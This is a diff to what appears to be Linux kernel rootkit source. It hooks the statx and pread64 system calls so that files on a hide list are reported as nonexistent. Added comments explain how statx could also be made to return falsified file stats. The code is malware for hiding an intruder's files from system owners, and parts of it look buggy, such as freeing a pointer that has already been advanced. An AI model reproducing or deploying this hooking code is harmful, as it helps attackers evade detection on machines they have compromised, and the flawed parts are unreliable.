@@ -90,7 +90,14 @@ static asmlinkage ssize_t hack_pread64(struct pt_regs *regs){
     return orig_pread64(regs);
 }
 
-
+/* when listing a file directly, the system uses statx() syscall.(note stat syscall)
+   statx returns information about a file, that is in the buffer in the address of pathname(rsi),
+   if its relative then its in relation to dirfd(rdi), which is the folder file descriptor,
+   flags(rdx) is used to change the behaveior of the function and mask(r10),
+   is used to tell the kernel which fields the caller is interested in,
+   the function then stores the stats collected at the struct statx which its address pointed by statxbuf(r8).
+   ! can also use this function to return false stats on files/dirs by changing the statx struct pointed to by statxbuf
+*/
 static asmlinkage int hack_statx(struct pt_regs *regs){
     char * token;
     char *temp_filename = kmalloc(NAME_MAX + 1, GFP_KERNEL);
@@ -174,17 +181,21 @@ static asmlinkage ssize_t hack_pread64(unsigned int fd, char *buf, size_t count,
     }
     return orig_pread64(fd, buf, count, pos);
 }
+
+
 static asmlinkage int hack_statx(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf){
     char * token;
     char *temp_filename = kmalloc(NAME_MAX + 1, GFP_KERNEL);
     if(temp_filename == NULL){
         return orig_statx(dirfd, pathname, flags, mask, statxbuf);
     }
-    if(copy_from_user(temp_filename, (char *)regs->si, NAME_MAX) != 0){
+
+    if(copy_from_user(temp_filename, pathname, NAME_MAX) != 0){
         kfree(temp_filename);
-        return orig_statx(regs);
+        return orig_statx(dirfd, pathname, flags, mask, statxbuf);
     }
-    while((token = strsep(&temp_filename, "/"))) { // loop through the string to extract all other tokens
+
+    while((token = strsep(&temp_filename, "/"))) { // loop through the string to extract each dir/filename in path by spliting /, strsep like strtok()
         if(find_node(&files_to_hide, token) == 0){
             kfree(temp_filename);
             return ENOENT;
